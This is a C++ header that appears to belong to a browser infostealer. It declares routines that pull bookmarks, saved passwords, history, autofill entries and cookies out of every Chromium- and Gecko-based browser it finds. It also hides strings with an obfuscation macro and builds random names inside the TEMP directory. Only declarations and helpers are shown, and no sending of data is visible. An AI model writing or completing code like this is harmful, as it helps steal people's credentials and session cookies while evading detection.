#ifndef BROWSERS_ENTRYPOINT_HPP
#define BROWSERS_ENTRYPOINT_HPP

#include <random>
#include <string>
#include <vector>
#include <algorithm>
#include <filesystem>
#include "Paths.hpp"
#include "Bookmarks.hpp"
#include "Passwords.hpp"
#include "History.hpp"
#include "Autofill.hpp"
#include "Cookies.hpp"
#include "os.hpp"
#include "obfusheader.h"



namespace Browser {
    std::vector<Bookmark> ExtractChromiumBookmarks();
    std::vector<Password> GetPasswords();
    std::vector<History> GetHistory();
    std::vector<Autofill> GetAutofill();
    std::vector<Cookie> GetCookies(); 
}

static auto chromiumBrowsers = Paths::ChromiumPaths(); // Getting all Chromium Browsers
static auto geckoBrowsers = Paths::GeckoPaths(); // Getting all Gecko Browsers
static std::string TEMP = OS::getenv(OBF("TEMP"));

static std::string RandomString(int length) {
    static const std::string chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    std::random_device rd;
    std::mt19937 generator(rd());
    std::uniform_int_distribution<> dist(0, chars.size() - 1);

    std::string result;
    result.reserve(length);
    for (int i = 0; i < length; ++i) {
        result += chars[dist(generator)];
    }
    return result;
}

#endif // BROWSERS_ENTRYPOINT_HPP
